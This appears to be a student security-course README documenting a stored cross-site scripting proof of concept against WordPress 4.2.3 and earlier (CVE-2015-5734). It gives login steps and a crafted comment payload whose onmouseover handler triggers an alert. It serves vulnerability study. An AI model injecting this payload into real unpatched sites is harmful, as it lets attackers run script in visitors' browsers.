# Steps
#### Step 1 - Log in as admin or editor

#### Step 2 - Inject XSS
######	Comment the payload.
	<a href='/wp-admin/' title="XSS" style="position:absolute;top:0;left:0;width:100%;height:100%;display:block;" onmouseover=alert(2)//' rel="nofollow">Hello World</a>




# The types / classes of vulnerabilities involved and any related CVE identifiers
#### Legacy Theme Preview Cross-Site Scripting (XSS)

#### CVE-2015-5734 



# Affected versions and patches
#### Affected version
###### WordPress <= 4.2.3 

#### Patched in
###### version 4.2.4



# Demo
![alt text](https://github.com/Mikhail-Kreytser/Cybersecurity-Week7/blob/master/XSS%202/Demo.gif "XSS Demo")

# References
#### https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5734
